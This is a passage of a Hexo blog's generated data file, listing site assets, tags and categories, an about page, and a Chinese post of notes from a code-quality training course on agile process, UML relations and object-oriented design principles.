0/26/2020/10/Activiti学习记录/index.html","hash":"283e5b577cfb46ca78fc169b09e3decc04b506b8","modified":1720692565006},{"_id":"public/tags/培训/index.html","hash":"cfe7cdfe572cb348fd41b579034c8e65e38ec389","modified":1720692565006},{"_id":"public/tags/配置/index.html","hash":"052eaaedfe8728e013948929340f41f06d96d7bc","modified":1720692565006},{"_id":"public/tags/配置/page/2/index.html","hash":"68e0b36915b36feea7c20a70a6f8ec9801e67c06","modified":1720692565006},{"_id":"public/tags/Java/index.html","hash":"21c3edb2c7e6263422c0734dd32f523722e5066e","modified":1720692565006},{"_id":"public/tags/macOS/index.html","hash":"c2542ba646826294820d7745740f30bade9d7795","modified":1720692565006},{"_id":"public/tags/DIY/index.html","hash":"3fa42059b54215c99fe799a718d4727931a628dd","modified":1720692565006},{"_id":"public/tags/SpringBoot/index.html","hash":"a84052f6ea8787c0c10e761126442a9bad4e17f7","modified":1720692565006},{"_id":"public/tags/SQL/index.html","hash":"a25fbc362e6f2922cf7f9a4d725f0afcddfea11c","modified":1720692565006},{"_id":"public/tags/TiDB/index.html","hash":"6f72e207235dd16ae63b194668202e5a446548e7","modified":1720692565006},{"_id":"public/tags/TypeScript/index.html","hash":"efcd54dc438ae5bc903f43a1cb8e226fbb027477","modified":1720692565006},{"_id":"public/tags/前端/index.html","hash":"917c2273b2fc5716c7bc470ddd0154a909124f87","modified":1720692565006},{"_id":"public/tags/博客/index.html","hash":"b1f56aadb913ae8521e6f35f11504bb9c13321e4","modified":1720692565006},{"_id":"public/tags/WSL/index.html","hash":"b8d456134abdda21f806a6bbeebdc190b0d26dc9","modified":1720692565006},{"_id":"public/tags/Todo/index.html","hash":"d02850d4e925faa86500b7026e38caeeb7dcb90d","modified":1720692565006},{"_id":"public/tags/Git/index.html","hash":"1c53c76a5add2d3fc15665a63ff09d4e26ea29ae","modified":1720692565006},{"_id":"public/tags/Linux/index.html","hash":"09d7337266b191378b9a941fbe826e6e4662693f","modified":1720692565006},{"_id":"public/tags/Windows/index.html","hash":"863fa581cf70bc036d63d77ea743798c3e73deaf","modified":1720692565006},{"_id":"public/tags/Vue/index.html","hash":"73b0b766acde4097fb0ce655726687ded7131af0","modified":1720692565006},{"_id":"public/tags/机器学习/index.html","hash":"bfb28a8bb5db69f1b25eebb878407b62dba70541","modified":1720692565006},{"_id":"public/tags/python/index.html","hash":"d4a34738496b8a6f1d614b7e75f233ca1459c486","modified":1720692565006},{"_id":"public/tags/Android/index.html","hash":"b7657c4ffa33b1b437794de742f56a7e7b71fa00","modified":1720692565006},{"_id":"public/tags/adb/index.html","hash":"de5c42d03339da96094f922951cc44a2a856d194","modified":1720692565006},{"_id":"public/tags/golang/index.html","hash":"cdf4e4cef3f909157069911779c9fec27af27d80","modified":1720692565006},{"_id":"public/tags/PowerBI/index.html","hash":"283711bbdcce772859b43fef7ad62f2f908f2bfb","modified":1720692565006},{"_id":"public/tags/tomcat/index.html","hash":"d813fff835d00ee716fc127d50b27d02b2f0f2b7","modified":1720692565006},{"_id":"public/tags/网络安全/index.html","hash":"b410882f5752db2fc92198150c614b31eab33aac","modified":1720692565006},{"_id":"public/categories/培训/index.html","hash":"a0cd27a3cf48c679bfdbb741330d81761b6dd8b7","modified":1720692565006},{"_id":"public/categories/配置/index.html","hash":"f4d64f211a91da57051704997938b8d55afb039a","modified":1720692565006},{"_id":"public/categories/配置/page/2/index.html","hash":"f3bc4a88a7cb1cceff66fa3afd308837bf4f7476","modified":1720692565006},{"_id":"public/categories/Java/index.html","hash":"b19c9f70fdf576521868c9e8f5fecc3966c14a17","modified":1720692565006},{"_id":"public/categories/DIY/index.html","hash":"ba019f07f388db2550408a4429a93945b028f090","modified":1720692565006},{"_id":"public/categories/SQL/index.html","hash":"c4ece454c632fde69ba23c0eadd59e3db0e06cde","modified":1720692565006},{"_id":"public/categories/配置/macOS/index.html","hash":"68f534ff32024b1f726e812bb2949052c04a6559","modified":1720692565006},{"_id":"public/categories/前端/index.html","hash":"b80dce6f887252499cfa016f69dc0d1592ff9578","modified":1720692565006},{"_id":"public/categories/DIY/软件/index.html","hash":"cae6b222436c0c90b0eb0c6cf141a72dbc93e2f0","modified":1720692565006},{"_id":"public/categories/配置/Linux/index.html","hash":"a7fe6aa4f430fa7ab41f9fc439c0bb0597604fe2","modified":1720692565006},{"_id":"public/categories/配置/WSL/index.html","hash":"42d8e039a2c0fdb25a53176bd420f1c89342f810","modified":1720692565006},{"_id":"public/categories/Java/SpringBoot/index.html","hash":"a0ab4d973412ad880a23a376325eac1a8097e5d9","modified":1720692565006},{"_id":"public/categories/博客/index.html","hash":"f271ad3558388d1dffb17c5d6e113b06c4ba5eb3","modified":1720692565006},{"_id":"public/categories/DIY/硬件/index.html","hash":"8b7481da3706b03cdbde87fff151ff21296c7077","modified":1720692565006},{"_id":"public/categories/SQL/TiDB/index.html","hash":"691d884ae2a184da05224dc1f219f33950d24884","modified":1720692565006},{"_id":"public/categories/Todo/index.html","hash":"779b0293b396b97bf87f2bc44c43fcb43d9ab8e7","modified":1720692565006},{"_id":"public/categories/Git/index.html","hash":"a77e2105e909a7c289ae0707cb3c3071b158c325","modified":1720692565006},{"_id":"public/categories/配置/Windows/index.html","hash":"40ea6a0928f6e61ef20aebad5fec05cb98fa72f7","modified":1720692565006},{"_id":"public/categories/前端/TypeScript/index.html","hash":"3665720b907cd87d4fe47f6792757ba67085af06","modified":1720692565006},{"_id":"public/categories/前端/Vue/index.html","hash":"addb8fbe0df7084d74f25ed60b6487f99615de81","modified":1720692565006},{"_id":"public/categories/培训/SpringBoot/index.html","hash":"0924633f16a54988ecd4a74b856b995cab3bd549","modified":1720692565006},{"_id":"public/categories/培训/机器学习/index.html","hash":"a4162a86f4e2890f1f6c03933dedc3c8dc593577","modified":1720692565006},{"_id":"public/categories/Android/index.html","hash":"b6f2ad629729e55a7a6b0c5cb92c61ed6dc68aa9","modified":1720692565006},{"_id":"public/categories/配置/Git/index.html","hash":"7697c030d208d84f14543d50ee7875a0dc943a94","modified":1720692565006},{"_id":"public/categories/博客/Jekyll/index.html","hash":"b622646845b040922a6b58f00fae9b40dd034466","modified":1720692565006},{"_id":"public/categories/配置/golang/index.html","hash":"59e90eed20b8a091f019c69164813c3de1351daa","modified":1720692565006},{"_id":"public/categories/配置/tomcat/index.html","hash":"e45622cb2a6880eab92c69d0201961cbaeda54e9","modified":1720692565006},{"_id":"public/categories/培训/PowerBI/index.html","hash":"a894c31be6c2f1a719ab1331ecf7544a8e5f7938","modified":1720692565006},{"_id":"public/categories/培训/网络安全/index.html","hash":"363f3eed1fc16183844dbb1d19772a3f8f24fa85","modified":1720692565006},{"_id":"public/categories/博客/Hexo/index.html","hash":"51831f053dad65ee99466a74eb19144599eb2da5","modified":1720692565006},{"_id":"public/categories/Android/adb/index.html","hash":"b7b09c01fdc85a81cc5e956655a8b87f8a93c12f","modified":1720692565006},{"_id":"public/archives/index.html","hash":"1e55a13676f036c8b7019d6d47282a140eccba53","modified":1720692565006},{"_id":"public/archives/page/2/index.html","hash":"7e24522853d059d56a62ee698b11bb97b7e40927","modified":1720692565006},{"_id":"public/archives/page/3/index.html","hash":"ac10753d452a94960a1f7667590a905d32429026","modified":1720692565006},{"_id":"public/archives/page/5/index.html","hash":"4aa36f3252da714587f5723adb29cc0049fec0c6","modified":1720692565006},{"_id":"public/archives/page/4/index.html","hash":"542a4957faa9508ad91db93f48875d3f1c52808e","modified":1720692565006},{"_id":"public/archives/2020/10/index.html","hash":"00084676de333d188a5d15a146fdb9187e6032c2","modified":1720692565006},{"_id":"public/archives/2020/index.html","hash":"8ebe0c7ed4241eff8cc8d4cabb23e359bc09d81f","modified":1720692565006},{"_id":"public/archives/2021/index.html","hash":"d8eec06c2875fcef562e0c76953d6d04baa39b6f","modified":1720692565006},{"_id":"public/archives/2021/page/2/index.html","hash":"6cd9278668b80ad0ee4ad6dd8e7c9b085e91b03e","modified":1720692565006},{"_id":"public/archives/2021/01/index.html","hash":"a5377a757ba916603b3dac26e18d61869e5ae6b3","modified":1720692565006},{"_id":"public/archives/2021/03/index.html","hash":"076605a5927319bc3978e4dae988cbf2eb4895e5","modified":1720692565006},{"_id":"public/archives/2021/05/index.html","hash":"a1a52db47a6e41152a8dd970c794042691fd4468","modified":1720692565006},{"_id":"public/archives/2021/06/index.html","hash":"840d8374e11cc5f27aed8ba1e554ae135160fcdd","modified":1720692565006},{"_id":"public/archives/2021/08/index.html","hash":"877c7e9650eb4e3163905f5ec515450a2a40eb69","modified":1720692565006},{"_id":"public/archives/2021/10/index.html","hash":"d8124dc6aa6a608813cca54d759a12a7922eabe5","modified":1720692565006},{"_id":"public/archives/2022/index.html","hash":"3caa7ff3a3d4da5082f0215094a8b2001a305165","modified":1720692565006},{"_id":"public/archives/2022/page/2/index.html","hash":"65ca185bda5ce58dd9839cf17c88181b270e0819","modified":1720692565006},{"_id":"public/archives/2022/05/index.html","hash":"a8b726e97c48a6a6cbf83366ae67aed64c6cc0cb","modified":1720692565006},{"_id":"public/archives/2022/07/index.html","hash":"f365710bdf12f1b452588eebe716595157193c00","modified":1720692565006},{"_id":"public/archives/2022/08/index.html","hash":"736546cd68c59afd9a58a761aad3d4299c95139f","modified":1720692565006},{"_id":"public/archives/2022/09/index.html","hash":"9b4f06fdc986fe1a9fcdd3a45d78d774d9acb0c5","modified":1720692565006},{"_id":"public/archives/2022/10/index.html","hash":"e9e5705e599f60f8d9a406e894073dea7a949f3b","modified":1720692565006},{"_id":"public/archives/2022/11/index.html","hash":"8f14761971db5b25304011713364c5e4150b5591","modified":1720692565006},{"_id":"public/archives/2022/12/index.html","hash":"cc1eb106961ea2173254f68d4aecebd922a390b1","modified":1720692565006},{"_id":"public/archives/2023/06/index.html","hash":"bc1ab4f51735390c171ead72da94767c83ec6d60","modified":1720692565006},{"_id":"public/archives/2023/index.html","hash":"afc38674bdf162eeb27c20b8e31957c8ff17dc45","modified":1720692565006},{"_id":"public/archives/2023/10/index.html","hash":"4adb71ab4867788b8d7cd5f55d1881387b7f4cbd","modified":1720692565006},{"_id":"public/archives/2024/index.html","hash":"76c7fdb3f2b14ef5d855ecd4e3c18f365fbb7211","modified":1720692565006},{"_id":"public/archives/2024/06/index.html","hash":"cb76e56c201e550d3ccc0e2061871f91d80d05b5","modified":1720692565006},{"_id":"public/index.html","hash":"6aeb229a09180aab2a840d0c9399d443be130a7c","modified":1720692565006},{"_id":"public/page/2/index.html","hash":"4eb5561b1d8acacfff6906db14e8fb1a06db7500","modified":1720692565006},{"_id":"public/page/3/index.html","hash":"639e23b6d12926a69804ee95ec776922770a7d55","modified":1720692565006},{"_id":"public/page/4/index.html","hash":"57c389a38896a4faca219d0df3daa88c8508190c","modified":1720692565006},{"_id":"public/page/5/index.html","hash":"927049629d2ae28f62c33928918bb8fb83c495c3","modified":1720692565006},{"_id":"public/images/avatar.gif","hash":"18c53e15eb0c84b139995f9334ed8522b40aeaf6","modified":1720692565006},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1720692565006},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1720692565006},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1720692565006},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1720692565006},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1720692565006},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1720692565006},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1720692565006},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1720692565006},{"_id":"public/images/favicon-16.ico","hash":"def3cab5d0a1f2905f3ba99c8a5155eba9fe67ba","modified":1720692565006},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1720692565006},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1720692565006},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1720692565006},{"_id":"public/images/logo.svg","hash":"d29cacbae1bdc4bbccb542107ee0524fe55ad6de","modified":1720692565006},{"_id":"public/images/favicon-32.ico","hash":"5e28df10232effae62e3a3ea9afa15c9efdd23fb","modified":1720692565006},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1720692565006},{"_id":"public/about/index/NotWasteTime.png","hash":"2314b88bf5f00ae0f0d973c0d5596657d2f89ec3","modified":1720692565006},{"_id":"public/js/algolia-search.js","hash":"498d233eb5c7af6940baf94c1a1c36fdf1dd2636","modified":1720692565006},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1720692565006},{"_id":"public/js/fireworks.js","hash":"9d33d5b5ca33641facaabba0507c9d0eaa5802f0","modified":1720692565006},{"_id":"public/js/bookmark.js","hash":"9734ebcb9b83489686f5c2da67dc9e6157e988ad","modified":1720692565006},{"_id":"public/js/next-boot.js","hash":"a1b0636423009d4a4e4cea97bcbf1842bfab582c","modified":1720692565006},{"_id":"public/css/main.css","hash":"55e24c393a579c68ec0b7472a2f3a6ee0ecb9a47","modified":1720692565006},{"_id":"public/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1720692565006},{"_id":"public/js/local-search.js","hash":"35ccf100d8f9c0fd6bfbb7fa88c2a76c42a69110","modified":1720692565006},{"_id":"public/js/utils.js","hash":"730cca7f164eaf258661a61ff3f769851ff1e5da","modified":1720692565006},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1720692565006},{"_id":"public/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1720692565006},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1720692565006},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1720692565006},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1720692565006},{"_id":"public/images/favicon-128.ico","hash":"3637c3ae98f58f998542511e8212603a90a37028","modified":1720692565006},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1720692565006},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1720692565006},{"_id":"public/images/avatar.jpg","hash":"c741c4d121e2797b103f706b44352e8b1378dd2f","modified":1720692565006}],"Category":[{"name":"培训","_id":"clyh3xcix0004zge366bqcdfp"},{"name":"配置","_id":"clyh3xciy000azge3e4mo6027"},{"name":"DIY","_id":"clyh3xciz000gzge398yj8tpa"},{"name":"Java","_id":"clyh3xcj0000kzge3ffphenqj"},{"name":"SQL","_id":"clyh3xcj0000rzge34uvl0irj"},{"name":"macOS","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcj20014zge37ysv4slg"},{"name":"前端","_id":"clyh3xcj2001azge31bab7bio"},{"name":"软件","parent":"clyh3xciz000gzge398yj8tpa","_id":"clyh3xcj3001mzge3fv9w2xou"},{"name":"Linux","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcj4001szge322ppg9yc"},{"name":"WSL","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcj50021zge3fur33040"},{"name":"SpringBoot","parent":"clyh3xcj0000kzge3ffphenqj","_id":"clyh3xcj50029zge30ys76bre"},{"name":"博客","_id":"clyh3xcj6002pzge30a2obv9w"},{"name":"硬件","parent":"clyh3xciz000gzge398yj8tpa","_id":"clyh3xcj6002yzge3f73uefld"},{"name":"TiDB","parent":"clyh3xcj0000rzge34uvl0irj","_id":"clyh3xcj70037zge3b4hi7bpm"},{"name":"Todo","_id":"clyh3xcj8003fzge3ato60gw1"},{"name":"Git","_id":"clyh3xcj8003ozge3am5s5x9e"},{"name":"Windows","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcja004hzge3hceehonv"},{"name":"TypeScript","parent":"clyh3xcj2001azge31bab7bio","_id":"clyh3xcja004uzge39kaidg3s"},{"name":"Vue","parent":"clyh3xcj2001azge31bab7bio","_id":"clyh3xcjb005hzge39b0e3bdt"},{"name":"SpringBoot","parent":"clyh3xcix0004zge366bqcdfp","_id":"clyh3xcjb0060zge39br76oz9"},{"name":"机器学习","parent":"clyh3xcix0004zge366bqcdfp","_id":"clyh3xcjb0067zge37kh30853"},{"name":"Android","_id":"clyh3xcjb006dzge37t487e4y"},{"name":"Git","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcjb006jzge3feuyhrlc"},{"name":"Jekyll","parent":"clyh3xcj6002pzge30a2obv9w","_id":"clyh3xcjc006qzge3hw4a54ce"},{"name":"golang","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcjc006wzge39ngr1oxs"},{"name":"tomcat","parent":"clyh3xciy000azge3e4mo6027","_id":"clyh3xcjc0072zge322o5b85t"},{"name":"PowerBI","parent":"clyh3xcix0004zge366bqcdfp","_id":"clyh3xcjc007dzge34kh1b3m3"},{"name":"网络安全","parent":"clyh3xcix0004zge366bqcdfp","_id":"clyh3xcjc007jzge32kxw647x"},{"name":"Hexo","parent":"clyh3xcj6002pzge30a2obv9w","_id":"clyh3xcjc007tzge30044280v"},{"name":"adb","parent":"clyh3xcjb006dzge37t487e4y","_id":"clyh3xcjd0082zge3edncgvpy"}],"Data":[],"Page":[{"title":"分类","date":"2021-08-20T12:15:15.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2021-08-20 20:15:15\ntype: \"categories\"\n---\n","updated":"2022-07-23T14:41:42.292Z","path":"categories/index.html","comments":1,"layout":"page","_id":"clyh3xcis0000zge3bbz96zqc","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"一点想法","date":"2021-08-20T12:14:12.000Z","type":"about","_content":"\n***Carpe Diem，Quam Minimum Credula Postero.***\n\n这句话我个人挺喜欢的，前半句是在看《死亡诗社》时知道的，这是拉丁语，英文意思是*seize the day*，整句话大意为——抓住今天，而不要过于相信明天。\n\n当然，我自认为大部分时候是没有做到这一步的，更多时间我只是活在自己的世界里。想做的事当然很多，比如自己完全敲出一个blog网站啊，比如自己组装一台游戏主机啊，比如学会弹吉他啊，但我最终只是将时间慢慢消耗在手机上，时光悄悄地、匆匆地在指缝间流走。\n\n![图片](index/NotWasteTime.png \"笑\")\n\n\n虽然我觉得这样其实也没什么，我是喜欢一动不动家里蹲的，但想做的事总是要慢慢去完成的。\n\n我曾经想着自己写一个博客网站，但疲懒的性子让我迟迟没有动手，买的服务器和域名也快到到期了，如今终于在网上找了教程，直接使用*github*仓库来作为第一个博客网站练手吧，借此机会也记录一些自己的东西。","source":"about/index.md","raw":"---\ntitle: 一点想法\ndate: 2021-08-20 20:14:12\ntype: \"about\"\n---\n\n***Carpe Diem，Quam Minimum Credula Postero.***\n\n这句话我个人挺喜欢的，前半句是在看《死亡诗社》时知道的，这是拉丁语，英文意思是*seize the day*，整句话大意为——抓住今天，而不要过于相信明天。\n\n当然，我自认为大部分时候是没有做到这一步的，更多时间我只是活在自己的世界里。想做的事当然很多，比如自己完全敲出一个blog网站啊，比如自己组装一台游戏主机啊，比如学会弹吉他啊，但我最终只是将时间慢慢消耗在手机上，时光悄悄地、匆匆地在指缝间流走。\n\n![图片](index/NotWasteTime.png \"笑\")\n\n\n虽然我觉得这样其实也没什么，我是喜欢一动不动家里蹲的，但想做的事总是要慢慢去完成的。\n\n我曾经想着自己写一个博客网站，但疲懒的性子让我迟迟没有动手，买的服务器和域名也快到到期了，如今终于在网上找了教程，直接使用*github*仓库来作为第一个博客网站练手吧，借此机会也记录一些自己的东西。","updated":"2022-07-23T14:41:42.292Z","path":"about/index.html","comments":1,"layout":"page","_id":"clyh3xciw0002zge385zq6al6","content":"<p><em><strong>Carpe Diem，Quam Minimum Credula Postero.</strong></em></p>\n<p>这句话我个人挺喜欢的，前半句是在看《死亡诗社》时知道的，这是拉丁语，英文意思是<em>seize the day</em>，整句话大意为——抓住今天，而不要过于相信明天。</p>\n<p>当然，我自认为大部分时候是没有做到这一步的，更多时间我只是活在自己的世界里。想做的事当然很多，比如自己完全敲出一个blog网站啊，比如自己组装一台游戏主机啊，比如学会弹吉他啊，但我最终只是将时间慢慢消耗在手机上，时光悄悄地、匆匆地在指缝间流走。</p>\n<p><img src=\"/index/NotWasteTime.png\" alt=\"图片\" title=\"笑\"></p>\n<p>虽然我觉得这样其实也没什么，我是喜欢一动不动家里蹲的，但想做的事总是要慢慢去完成的。</p>\n<p>我曾经想着自己写一个博客网站，但疲懒的性子让我迟迟没有动手，买的服务器和域名也快到到期了，如今终于在网上找了教程，直接使用<em>github</em>仓库来作为第一个博客网站练手吧，借此机会也记录一些自己的东西。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><em><strong>Carpe Diem，Quam Minimum Credula Postero.</strong></em></p>\n<p>这句话我个人挺喜欢的，前半句是在看《死亡诗社》时知道的，这是拉丁语，英文意思是<em>seize the day</em>，整句话大意为——抓住今天，而不要过于相信明天。</p>\n<p>当然，我自认为大部分时候是没有做到这一步的，更多时间我只是活在自己的世界里。想做的事当然很多，比如自己完全敲出一个blog网站啊，比如自己组装一台游戏主机啊，比如学会弹吉他啊，但我最终只是将时间慢慢消耗在手机上，时光悄悄地、匆匆地在指缝间流走。</p>\n<p><img src=\"/index/NotWasteTime.png\" alt=\"图片\" title=\"笑\"></p>\n<p>虽然我觉得这样其实也没什么，我是喜欢一动不动家里蹲的，但想做的事总是要慢慢去完成的。</p>\n<p>我曾经想着自己写一个博客网站，但疲懒的性子让我迟迟没有动手，买的服务器和域名也快到到期了，如今终于在网上找了教程，直接使用<em>github</em>仓库来作为第一个博客网站练手吧，借此机会也记录一些自己的东西。</p>\n"},{"title":"标签","date":"2021-08-20T12:14:27.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2021-08-20 20:14:27\ntype: \"tags\"\n---\n","updated":"2022-07-23T14:41:42.293Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clyh3xcix0006zge396h1dc57","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"代码质量培训","date":"2021-01-15T01:00:00.000Z","_content":"\n这里记录的是上的培训课的东西\n\n<!--more-->\n\n# 引导\n\n> 面向对象\n>\n> 封装、继承、多态（最重要）\n\n避免小白兔思维，不是小白兔喜欢胡萝卜就表示鱼也喜欢胡萝卜\n\n# 软件研发管理精要\n\n> 软件工程过程\n>\n> ​ |— 瀑布模型：预测型，但需求会变化\n>\n> ​ |— ~ ：适应型\n>\n> ​ |— SCRUM\n>\n>                - 重过程：长期而详细的计划，文档繁多，面向过程而不是面向人，预见而不是适应\n>\n>                - 轻过程：项目目标明确，有效和高效原则，适应而不是预见\n>\n>                   |— Agile开发 Just Enough\n\n1. 团队一起做计划->达成共识->一致执行\n\n2. 杜绝小白兔思维->确定需求\n\n> 1.  乐观\n>\n> 2.  DOD-完成的定义\n>\n> 3.  以终为始\n\n> 原型法：业务系统最重要的方法\n>\n> axure-交互原型设计软件\n\n> 精益软件原则\n>\n> - 避免浪费。过度加工，不合理的等待，第一层次的代码\n>\n> - 推迟决策。做好需求\n>\n> - 代码规范。可通过框架实现\n\n# Enterprise Architect\n\n|  现实世界  |   类图    | 备注                                                                           |\n| :--------: | :-------: | ------------------------------------------------------------------------------ |\n| 一般与特殊 |  —▹ 泛化  | is a (kind of) / 100%原则，重用（包括关系）                                    |\n|            | ---▹ 实现 | 类实现接口                                                                     |\n| 整体与部分 |  —♦ 组合  | 整体管理部分的生命周期                                                         |\n|            |  —◊ 聚合  | 整体不一定管理部分的生命周期                                                   |\n|    合作    |  —>连接   | （组合、聚合、连接）关联：一个对象通过属性来表达对象对另一个对象的静态依赖关系 |\n|            | --->依赖  | 一个对象通过操作（行为）来表达对象对另一个对象的静态依赖关系                   |\n\n# 面向对象设计原则\n\n- LSP 里氏替换原则\n\n  > 子类不能添加父类没有的约束\n  >\n  > 基类要继承接口/抽象类，在可能的情况下，由抽象类（接口）继承\n\n- OCP 开放关闭原则\n\n  > 关键在于抽象\n  >\n  > open 拓展，close 修改\n\n- SRP 单一职责原则\n\n  > 类要么是信息类（Entity），要么是服务（Service）\n  >\n  > DDD Domain Driven Design，领域驱动设计\n\n- ISP 接口隔离原则\n\n  > - 使用委托分离接口，Adapter 模式\n  >\n  > - 使用多重继承分离接口\n  >\n  > 一个类对另一个类的依赖性应当建立在最小接口上，使用多个专门接口比单一肥接口好\n  >\n  > 避免接口污染\n\n- DIP 依赖倒置原则\n\n  > - 高层模块不应依赖于低层模块，二者都应依赖于抽象\n  > - 抽象不应该依赖于细节，细节应该依赖于抽象\n  > - 针对接口编程，避免针对实现编程\n  >\n  > 经典案例 Mark IV 咖啡机\n\n- 启发式原则\n\n  > 依赖于抽象，程序中所有依赖关系应终止于抽象类或接口\n  >\n  > - 任何变量都不应该拥有指向具体类的指针或引用\n  >\n  > - 任何类都不应该从具体类派生\n  >\n  > - 任何方法都不应该改写其任何基类中已经实现的方法\n\n- CARP 合成/聚合复用原则\n\n  > 尽量使用合成/聚合，而不是继承\n  >\n  > 在一个新的对象里面使用一些已有的对象，新的对象通过向这些对象的委派达到复用已有功能的目的\n\n- LOD 迪米特法则 / LKD 最少知识原则\n\n  > 不要与陌生人讲话\n  >\n  > 只与你直接的朋友们通信\n  >\n  > 每个软件单位对其他单位都只有最少的知识，而且局限于与本单位密切相关的软件单位\n  >\n  > 狭义迪米特法则：两个不必彼此直接通信的类不应该发生直接的相互作用，此时要调用另一个类的方法时可以通过第三方转发这个调用\n\n# 设计模式\n\n- 核心思维：多态包容\n\n  > 一个宿主对象中包含基类型（或接口）引用，并将一部分行为委托给这个引用所指向的实际对象，使自己的行为可以根据实际对象的不同而有所不同\n  >\n  > 例子：汉堡店问题 ——类爆炸性增长，破坏单点维护能力\n  >\n  > ​ |——使用设计模式解决\n\n# 代码质量\n\n代码审查\n\n代码走查\n\nSonarQube 代码质量管理平台\n\n# 书籍推荐\n\n《重构》——Martin Fowler\n\n《敏捷软件开发》——Robert C Martin\n\n《UML 和模式应用》——拉曼\n\n《设计模式》——Eric Gamma...\n\n《影响力》——罗伯特·西奥迪尼\n\n《金字塔原理》——巴巴拉·明托\n\n《敏捷革命》——杰夫·萨瑟兰\n","source":"_posts/2021/01/代码质量培训.md","raw":"---\ntitle: 代码质量培训\ndate: 2021-01-15 09:00:00\ntags:\n  - 培训\ncategories:\n  - 培训\n---\n\n这里记录的是上的培训课的东西\n\n<!--more-->\n\n# 引导\n\n> 面向对象\n>\n> 封装、继承、多态（最重要）\n\n避免小白兔思维，不是小白兔喜欢胡萝卜就表示鱼也喜欢胡萝卜\n\n# 软件研发管理精要\n\n> 软件工程过程\n>\n> ​ |— 瀑布模型：预测型，但需求会变化\n>\n> ​ |— ~ ：适应型\n>\n> ​ |— SCRUM\n>\n>                - 重过程：长期而详细的计划，文档繁多，面向过程而不是面向人，预见而不是适应\n>\n>                - 轻过程：项目目标明确，有效和高效原则，适应而不是预见\n>\n>                   |— Agile开发 Just Enough\n\n1. 团队一起做计划->达成共识->一致执行\n\n2. 杜绝小白兔思维->确定需求\n\n> 1.  乐观\n>\n> 2.  DOD-完成的定义\n>\n> 3.  以终为始\n\n> 原型法：业务系统最重要的方法\n>\n> axure-交互原型设计软件\n\n> 精益软件原则\n>\n> - 避免浪费。过度加工，不合理的等待，第一层次的代码\n>\n> - 推迟决策。做好需求\n>\n> - 代码规范。可通过框架实现\n\n# Enterprise Architect\n\n|  现实世界  |   类图    | 备注                                                                           |\n| :--------: | :-------: | ------------------------------------------------------------------------------ |\n| 一般与特殊 |  —▹ 泛化  | is a (kind of) / 100%原则，重用（包括关系）                                    |\n|            | ---▹ 实现 | 类实现接口                                                                     |\n| 整体与部分 |  —♦ 组合  | 整体管理部分的生命周期                                                         |\n|            |  —◊ 聚合  | 整体不一定管理部分的生命周期                                                   |\n|    合作    |  —>连接   | （组合、聚合、连接）关联：一个对象通过属性来表达对象对另一个对象的静态依赖关系 |\n|            | --->依赖  | 一个对象通过操作（行为）来表达对象对另一个对象的静态依赖关系                   |\n\n# 面向对象设计原则\n\n- LSP 里氏替换原则\n\n  > 子类不能添加父类没有的约束\n  >\n  > 基类要继承接口/抽象类，在可能的情况下，由抽象类（接口）继承\n\n- OCP 开放关闭原则\n\n  > 关键在于抽象\n  >\n  > open 拓展，close 修改\n\n- SRP 单一职责原则\n\n  > 类要么是信息类（Entity），要么是服务（Service）\n  >\n  > DDD Domain Driven Design，领域驱动设计\n\n- ISP 接口隔离原则\n\n  > - 使用委托分离接口，Adapter 模式\n  >\n  > - 使用多重继承分离接口\n  >\n  > 一个类对另一个类的依赖性应当建立在最小接口上，使用多个专门接口比单一肥接口好\n  >\n  > 避免接口污染\n\n- DIP 依赖倒置原则\n\n  > - 高层模块不应依赖于低层模块，二者都应依赖于抽象\n  > - 抽象不应该依赖于细节，细节应该依赖于抽象\n  > - 针对接口编程，避免针对实现编程\n  >\n  > 经典案例 Mark IV 